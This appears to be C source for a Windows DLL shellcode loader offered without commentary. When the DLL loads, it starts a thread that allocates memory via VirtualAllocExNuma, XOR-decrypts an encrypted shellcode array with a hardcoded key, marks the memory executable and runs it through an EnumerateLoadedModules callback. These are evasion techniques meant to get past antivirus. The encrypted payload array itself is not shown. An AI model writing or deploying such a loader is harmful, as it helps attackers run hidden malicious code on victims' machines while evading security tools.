#include <windows.h>
#include <dbghelp.h>





DWORD ThreadProc(LPVOID param) {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	char shellcode[sizeof Ciphertext];
	char key[] = "kwekVzEZCDj4oCMD";
	int j = 0;
	for (int i = 0; i < sizeof Ciphertext; i++) {
		if (j == sizeof key - 1) j = 0;

		shellcode[i] = Ciphertext[i] ^ key[j];
		j++;
	}

	RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	EnumerateLoadedModules(GetCurrentProcess(), (PENUMLOADED_MODULES_CALLBACK)addr, NULL);

}

BOOL WINAPI DllMain (HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
		case DLL_PROCESS_ATTACH:
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadProc, (LPVOID)NULL, 0, NULL);
		break;
	}
	return TRUE;
}

void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
	while (TRUE)
		Sleep(60 * 1000);
}
	